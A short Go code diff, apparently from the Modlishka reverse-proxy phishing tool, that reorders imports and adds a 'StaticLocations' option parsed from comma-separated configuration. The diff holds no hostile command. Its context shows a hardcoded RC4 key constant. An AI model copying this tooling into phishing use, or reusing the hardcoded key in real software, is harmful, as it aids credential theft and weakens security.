@@ -2,11 +2,12 @@ package runtime
 
 import (
 	"encoding/base64"
-	"github.com/drk1wi/Modlishka/config"
-	"golang.org/x/net/publicsuffix"
 	"log"
 	"regexp"
 	"strings"
+
+	"github.com/drk1wi/Modlishka/config"
+	"golang.org/x/net/publicsuffix"
 )
 
 // compiled regexp
@@ -39,6 +40,8 @@ var (
 	ForceHTTP          bool
 	AllowSecureCookies bool
 
+	StaticLocations []string
+
 	//openssl rand -hex 32
 	RC4_KEY = `1b293b681a3edbfe60dee4051e14eeb81b293b681a3edbfe60dee4051e14eeb8`
 )
@@ -67,6 +70,10 @@ func SetCoreRuntimeConfig(conf config.Options) {
 
 	if len(*conf.TerminateTriggers) != 0 {
 		TerminateTriggers = strings.Split(string(*conf.TerminateTriggers), ",")
+	}
+
+	if len(*conf.StaticLocations) != 0 {
+		StaticLocations = strings.Split(string(*conf.StaticLocations), ",")
 	}
 
 	if len(*conf.TargetRules) != 0 {
